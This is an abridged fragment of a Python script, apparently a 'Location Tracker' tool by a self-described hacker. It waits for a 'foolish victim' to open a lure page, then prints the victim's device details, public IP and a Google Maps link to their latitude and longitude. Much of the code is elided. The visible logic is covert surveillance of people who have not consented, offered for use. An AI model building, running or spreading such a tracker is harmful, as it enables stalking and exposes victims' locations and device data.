...
def banner():
  ...
  _                     _   _               _______             _             
 | |                   | | (_)             |__   __|           | |            
 | |     ___   ___ __ _| |_ _  ___  _ __      | |_ __ __ _  ___| | _____ _ __ 
 | |    / _ \ / __/ _` | __| |/ _ \| '_ \     | | '__/ _` |/ __| |/ / _ \ '__|
 | |___| (_) | (_| (_| | |_| | (_) | | | |    | | | | (_| | (__|   <  __/ |   
 |______\___/ \___\__,_|\__|_|\___/|_| |_|    |_|_|  \__,_|\___|_|\_\___|_|   
                                                                              ''' + W)
	print('\n' + G + '' + C + ' $$created by>>: ' + W + 'A.Boss the hacker')
...
def tunnel_select():
	if tunnel_mode == None:
		...
		print(G + '' + C + ' Starting Location Tracker Pro PLease wait  ' + W + '\n')
	else:
		print(R + '' + C + ' ' + W + '\n')
		exit()
...
def template_select():
	...
	print(G + '' + C + ' Select a Template Style  : ' + W + '\n')
...
def wait():
	...
	while True:
		...
		if size == 0 and printed == False:
			print('\n' + G + '[+]' + C + ' Waiting for the foolish victim ' + W + '\n')
			printed = True
		if size > 0:
			main()
...
def main():
	...
	try:
		...
		with open (info, 'r') as file2:
			...
			for value in json3['dev']:
				...
				print(G + '1' + C + ' system Info: ' + W + '\n')
				print(G + '2' + C + ' system OS  : ' + W + var_os)
				print(G + '3' + C + ' Platform   : ' + W + var_platform)
				print(G + '4' + C + ' CPU Core  : ' + W + var_cores)
				print(G + '5' + C + ' RAM        : ' + W + var_ram)
				print(G + '6' + C + ' GPU Vendor : ' + W + var_vendor)
				print(G + '7' + C + ' GPU        : ' + W + var_render)
				print(G + '8' + C + ' Resolution : ' + W + var_res)
				print(G + '9' + C + ' Browser    : ' + W + var_browser)
				print(G + '10' + C + ' Public IP  : ' + W + var_ip)
	...
	print ('\n' + G + '' + C + ' Google Maps  location .......: ' + W + 'https://www.google.com/maps/place/' + var_lat.strip(' deg') + '+' + var_lon.strip(' deg'))
